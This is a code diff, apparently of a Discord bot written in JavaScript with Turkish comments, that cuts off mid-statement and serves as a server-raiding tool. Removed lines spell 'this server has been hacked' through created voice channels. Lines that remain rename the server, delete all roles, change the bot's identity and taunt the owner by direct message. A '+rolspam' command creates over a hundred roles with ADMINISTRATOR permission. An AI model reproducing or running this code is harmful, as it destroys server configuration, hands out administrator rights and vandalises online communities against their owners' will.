-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-    await msg.guild.setIcon("https://i.hizliresim.com/MpAB0o.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setName("KAPATILDI!"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
-    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await client.user.setAvatar("https://cdn.discordapp.com/attachments/731601185584447549/865348349833117736/BL9BtME5_400x400.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setUsername("MÖÖ6");    //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.owner.send("**Sunucuyu kapattım kanki :d**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
-  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+  }  
 });
 
- //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
+
 
     client.on("message", msg => {
   if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
-      name: "HACKED",
+      name: "LATTE",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-        msg.guild.createRole({
-      name: "HACKED",
-      color: "C22F2F",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-            msg.guild.createRole({
-      name: "HACKED",
-      color: "E12020",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FF0000",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FF3E00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FF4D00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FF6C00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FF9300",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FFAE00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FFD500",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "FFFF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "E0FF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "C1FF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "93FF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "74FF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "3EFF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "0CFF00",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "00FF2E",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "00FF6C",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                msg.guild.createRole({
-      name: "HACKED",
-      color: "00FFA6",
-      permissions: ["ADMINISTRATOR"] //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
-    });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "00FFD4",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "00FFFB",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "00C9FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "009BFF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "006CFF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "003AFF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "001BFF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "1F00FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "4200FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "7C00FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "A200FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "C500FF",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "FF00F3",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "FF00B6",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "FF0097",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "FF005D",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
-                    msg.guild.createRole({
-      name: "HACKED",
-      color: "FF0032",
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
+      permissions: ["ADMINISTRATOR"]
+    });
+    msg.guild.createRole({
+      name: "LATTE",
+      color: "A93D3D",
